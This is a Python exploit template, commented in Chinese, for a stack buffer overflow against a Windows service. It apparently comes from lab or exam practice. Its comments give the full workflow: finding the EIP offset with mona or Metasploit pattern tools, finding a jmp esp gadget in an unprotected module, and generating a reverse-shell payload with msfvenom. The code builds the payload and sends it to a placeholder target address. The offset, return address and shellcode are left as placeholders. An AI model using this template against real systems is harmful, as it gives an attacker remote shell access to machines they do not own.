import socket, os



# EIP偏移

# 创建测试字符串 方法1： 使用命令“!mona pattern_create 3000 ”

# 创建测试字符串 方法2：使用msf框架，命令如下

#  “/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 ”

# 发送后程序崩溃看调试器中EIP的值，然后用下面命令查找EIP偏移

# 查找EIP偏移 方法1：使用命令“!mona pattern_offset <EIP的值>” 

# 查找EIP偏移 方法2：使用msf框架，命令如下 

#  “/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP的值>”

# 获得EIP偏移后替换下面eip_offset的值

eip_offset = 10000



# 用“A”填充缓冲区，直到EIP偏移位置

junk = "A" * eip_offset



# 获得jmp esp指令的地址

# 使用命令“!mona modules ”获得程序加载模块信息

# 找一个没有开启Rebase, SafeSEH, ASLR, NXCompat的模块dll

# 使用命令“ !mona find -s '\xff\xe4' -m <模块名>”在模块中查找jmp esp的地址

# 注意：要选择一个没有坏字符的地址

# 将地址反写替换下面eip的值

eip = "\x12\x34\x56\x78"



# 在shellcode前填充nop指令，可提高兼容性

nop = "\x90" * 20



# 生成反弹Shellcode

# 使用命令“msfvenom -p windows/shell_reverse_tcp lhost=<本机IP> lport=<监听端口> -b '\x00\x坏\x字\x符' -f python”

# 将生成shellcode替换下面sc

sc = ""



# 组装payload  

# payload   = [AAAAAA...AAA][EIP][NOP][Shellcode]

payload = junk + eip + nop + sc



# 发送到目标靶机的某个端口如 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("<靶机地址>", <端口>))

s.sendall(payload)

s.close()

